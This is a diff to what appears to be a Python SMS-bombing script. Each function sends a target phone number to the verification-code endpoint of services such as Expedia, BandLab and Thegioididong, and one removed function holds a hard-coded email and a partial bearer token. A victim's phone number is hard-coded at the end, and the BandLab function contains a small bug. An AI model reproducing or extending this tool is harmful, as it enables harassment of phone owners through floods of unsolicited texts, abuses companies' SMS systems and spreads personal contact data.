@@ -234,26 +234,22 @@ def expedia(phone): #phone = 0943687522
 		}
 	data["mobile_phone"] = phone
 	res = requests.post(link,data=data, headers = headers)
-	return(res, res.text)
+	return(res,res.text)
 
 def bandlab(phone): #phone = 84943687522
 	link = "https://www.bandlab.com/api/v1.3/phones/84{0}/codes".format(phone[1:])
 	res = requests.post(link).json()
 	return(res,res.text)
 
-def goomo(phone):
-	link = "https://auth.goomo.com/v2/phone_confirmation/verify_user"
-	json = {"email":"baonhi@gmail.com","phone_number":"","country_code":"+84"}
-	json["phone_number"] = phone
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
-		"client": "desktop",
-		"X-Goomo-Platform": "Desktop",
-		"Authorization": "Bearer 8ZWdvlrC"
+def tgdd(phone): #phone = 0943687522
+	link = "https://www.thegioididong.com/lich-su-mua-hang/Home/GetVerifyCode"
+	json = {
+		"phoneNumber": "",
+		"IsReSend": "false"
 		}
-	res = requests.post(link,json=json,headers=headers)
+	json["phoneNumber"] = phone
+	res = requests.post(link,json=json)
 	return(res,res.text)
 
-	
 phone = "0345133151"
 
